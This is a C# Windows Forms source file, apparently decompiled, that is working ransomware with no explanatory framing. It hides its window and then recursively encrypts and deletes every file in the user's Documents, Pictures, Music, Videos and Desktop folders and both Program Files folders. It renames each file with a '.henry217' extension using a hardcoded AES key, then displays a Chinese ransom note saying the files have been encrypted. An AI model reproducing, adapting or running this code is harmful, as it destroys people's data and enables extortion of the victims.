using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace ns0;

public class Form1 : Form
{
	public static int t;

	private IContainer components;

	private Label label1;

	private Label label2;

	private BackgroundWorker backgroundWorker1;

	private BackgroundWorker backgroundWorker2;

	private BackgroundWorker backgroundWorker3;

	private BackgroundWorker backgroundWorker4;

	private BackgroundWorker backgroundWorker5;

	private BackgroundWorker backgroundWorker6;

	private BackgroundWorker backgroundWorker7;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		backgroundWorker1.RunWorkerAsync();
		backgroundWorker2.RunWorkerAsync();
		backgroundWorker3.RunWorkerAsync();
		backgroundWorker4.RunWorkerAsync();
		backgroundWorker5.RunWorkerAsync();
		backgroundWorker6.RunWorkerAsync();
		backgroundWorker7.RunWorkerAsync();
	}

	public static void bl(DirectoryInfo TheFolder)
	{
		DirectoryInfo[] directories = TheFolder.GetDirectories();
		foreach (DirectoryInfo directoryInfo in directories)
		{
			try
			{
				bl(new DirectoryInfo(directoryInfo.FullName));
			}
			catch (Exception)
			{
			}
		}
		FileInfo[] files = TheFolder.GetFiles();
		foreach (FileInfo fileInfo in files)
		{
			try
			{
				FileStream fileStream = new FileStream(fileInfo.FullName, FileMode.Open, FileAccess.Read);
				byte[] array = new byte[fileStream.Length];
				fileStream.Read(array, 0, array.Length);
				fileStream.Close();
				fileInfo.Delete();
				byte[] buffer = AESEncrypt(array, "12345678");
				FileStream fileStream2 = new FileStream(fileInfo.FullName + ".henry217", FileMode.Create, FileAccess.Write);
				fileStream2.Write(buffer, 0, array.Length);
				fileStream2.Close();
				File.Delete(fileInfo.FullName);
			}
			catch (Exception)
			{
			}
		}
	}

	public static byte[] AESEncrypt(byte[] EncryptByte, string EncryptKey)
	{
		if (EncryptByte.Length == 0)
		{
			throw new Exception("明文不得为空");
		}
		if (string.IsNullOrEmpty(EncryptKey))
		{
			throw new Exception("密钥不得为空");
		}
		byte[] rgbIV = Convert.FromBase64String("Rkb4jvUy/ye7Cd7k89QQgQ==");
		byte[] rgbSalt = Convert.FromBase64String("gsf4jvkyhye5/d7k8OrLgM==");
		Rijndael rijndael = Rijndael.Create();
		try
		{
			MemoryStream memoryStream = new MemoryStream();
			PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(EncryptKey, rgbSalt);
			ICryptoTransform transform = rijndael.CreateEncryptor(passwordDeriveBytes.GetBytes(32), rgbIV);
			CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
			cryptoStream.Write(EncryptByte, 0, EncryptByte.Length);
			cryptoStream.FlushFinalBlock();
			byte[] result = memoryStream.ToArray();
			memoryStream.Close();
			memoryStream.Dispose();
			cryptoStream.Close();
			cryptoStream.Dispose();
			return result;
		}
		catch (Exception)
		{
			throw;
		}
		finally
		{
			rijndael.Clear();
		}
	}

	private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
	{
		bl(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Personal)));
		t++;
		if (t == 7)
		{
			((Control)this).Show();
			((Control)this).set_Visible(true);
		}
	}

	private void backgroundWorker2_DoWork(object sender, DoWorkEventArgs e)
	{
		bl(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)));
		t++;
		if (t == 7)
		{
			((Control)this).Show();
			((Control)this).set_Visible(true);
		}
	}

	private void backgroundWorker3_DoWork(object sender, DoWorkEventArgs e)
	{
		bl(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)));
		t++;
		if (t == 7)
		{
			((Control)this).Show();
			((Control)this).set_Visible(true);
		}
	}

	private void backgroundWorker4_DoWork(object sender, DoWorkEventArgs e)
	{
		bl(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos)));
		t++;
		if (t == 7)
		{
			((Control)this).Show();
			((Control)this).set_Visible(true);
		}
	}

	private void backgroundWorker5_DoWork(object sender, DoWorkEventArgs e)
	{
		bl(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)));
		t++;
		if (t == 7)
		{
			((Control)this).Show();
			((Control)this).set_Visible(true);
		}
	}

	private void backgroundWorker6_DoWork(object sender, DoWorkEventArgs e)
	{
		bl(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)));
		t++;
		if (t == 7)
		{
			((Control)this).Show();
			((Control)this).set_Visible(true);
		}
	}

	private void backgroundWorker7_DoWork(object sender, DoWorkEventArgs e)
	{
		bl(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86)));
		t++;
		if (t == 7)
		{
			((Control)this).Show();
			((Control)this).set_Visible(true);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Expected O, but got Unknown
		//IL_0113: Unknown result type (might be due to invalid IL or missing references)
		//IL_011d: Expected O, but got Unknown
		label1 = new Label();
		label2 = new Label();
		backgroundWorker1 = new BackgroundWorker();
		backgroundWorker2 = new BackgroundWorker();
		backgroundWorker3 = new BackgroundWorker();
		backgroundWorker4 = new BackgroundWorker();
		backgroundWorker5 = new BackgroundWorker();
		backgroundWorker6 = new BackgroundWorker();
		backgroundWorker7 = new BackgroundWorker();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("微软雅黑 Light", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)134));
		((Control)label1).set_Location(new Point(425, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(128, 46));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("勒索信");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("微软雅黑 Light", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)134));
		((Control)label2).set_Location(new Point(258, 116));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(524, 46));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("你好。你的重要文件都已被加密");
		backgroundWorker1.DoWork += backgroundWorker1_DoWork;
		backgroundWorker2.DoWork += backgroundWorker2_DoWork;
		backgroundWorker3.DoWork += backgroundWorker3_DoWork;
		backgroundWorker4.DoWork += backgroundWorker4_DoWork;
		backgroundWorker5.DoWork += backgroundWorker5_DoWork;
		backgroundWorker6.DoWork += backgroundWorker6_DoWork;
		backgroundWorker7.DoWork += backgroundWorker7_DoWork;
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(9f, 18f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(1066, 261));
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("勒索信");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
